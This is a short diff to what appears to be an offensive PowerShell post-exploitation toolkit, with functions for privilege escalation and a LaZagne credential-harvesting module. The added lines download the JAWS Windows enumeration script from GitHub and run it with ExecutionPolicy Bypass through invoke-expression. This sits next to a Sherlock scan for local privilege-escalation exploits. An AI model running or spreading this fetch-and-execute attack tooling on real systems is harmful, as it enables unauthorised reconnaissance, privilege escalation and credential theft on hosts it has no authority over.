@@ -357,6 +357,10 @@ function privescmodules
 
     Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
     Find-AllVulns >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
+
+    Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
+    invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'
 }
 
 function lazagnemodule
